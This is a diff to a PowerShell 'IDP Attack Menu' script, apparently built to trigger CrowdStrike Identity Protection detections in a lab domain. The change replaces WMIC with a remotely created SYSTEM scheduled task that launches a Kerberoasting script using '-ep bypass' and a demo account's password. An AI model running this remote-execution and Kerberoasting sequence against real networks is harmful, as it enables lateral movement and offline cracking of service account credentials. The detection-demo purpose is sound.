@@ -112,7 +112,7 @@ function Show-StepBanner {
     Write-Host ""
 }
 
-$scriptVersion = "5.2.3"
+$scriptVersion = "5.3"
 Write-Host "[+] IDP Attack Menu v$scriptVersion" -ForegroundColor Cyan
 Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  DT=$env:ENV_DT  UBUNTU=$env:ENV_UBUNTU" -ForegroundColor Green
 Start-Sleep -Seconds 2
@@ -517,7 +517,7 @@ public class CryptoMD4 {
                 "with SPNs in Active Directory. The ticket is encrypted"
                 "with the service account password hash - crackable offline."
                 ""
-                "Executed remotely on DT via WMIC + SMB."
+                "Executed remotely on DT via scheduled task (SYSTEM)."
                 "CrowdStrike IDP detects this pattern on the DC."
             ) -Detection "CrowdStrike IDP: Kerberoasting / SuspiciousKerberosTicketRequest"
 
@@ -576,12 +576,27 @@ try {
                 if (Test-Path $_) { Remove-Item $_ -Force }
             }
 
-            # --- Execute via WMIC ---
-            Write-Host "  [*] Executing Kerberoast on DT via WMIC..." -ForegroundColor White
+            # --- Execute via remote scheduled task as SYSTEM ---
+            # SYSTEM on domain-joined DT authenticates to AD as the computer account
+            Write-Host "  [*] Creating scheduled task on DT (runs as SYSTEM for domain access)..." -ForegroundColor White
             Write-Host "  [*] This triggers IDP detection on the DC." -ForegroundColor Yellow
-            $wmicCmd = "wmic /node:$env:ENV_DT /user:$env:ENV_DT\demo /password:$demoPw process call create `"powershell.exe -ep bypass -file C:\IDP_Files\run_kerberoast.ps1`""
-            cmd.exe /c $wmicCmd 2>&1 | Out-Null
-            Write-Host "  [*] WMIC process launched. Waiting for results..." -ForegroundColor White
+            $taskName = "IDP_Kerberoast"
+            $taskCmd = "powershell.exe -ep bypass -file C:\IDP_Files\run_kerberoast.ps1"
+
+            # Delete any existing task
+            schtasks /delete /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /f 2>$null | Out-Null
+
+            # Create task as SYSTEM
+            $createResult = schtasks /create /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /tr $taskCmd /sc once /st 00:00 /ru SYSTEM /f 2>&1
+            if ($LASTEXITCODE -ne 0) {
+                Write-Host "  [!] Failed to create scheduled task: $createResult" -ForegroundColor Red
+                break
+            }
+            Write-Host "  [+] Task created. Running..." -ForegroundColor Green
+
+            # Run the task
+            schtasks /run /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName 2>&1 | Out-Null
+            Write-Host "  [*] Task launched. Waiting for results..." -ForegroundColor White
 
             # --- Wait for output (force SMB cache refresh) ---
             $maxWait = 45
@@ -676,6 +691,7 @@ try {
             }
 
             # Cleanup
+            schtasks /delete /s $env:ENV_DT /u "$env:ENV_DT\demo" /p $demoPw /tn $taskName /f 2>$null | Out-Null
             Remove-Item "$dtIdpRemote\run_kerberoast.ps1" -Force -ErrorAction SilentlyContinue
             net use $dtShare /delete /y 2>$null | Out-Null
             Write-Host
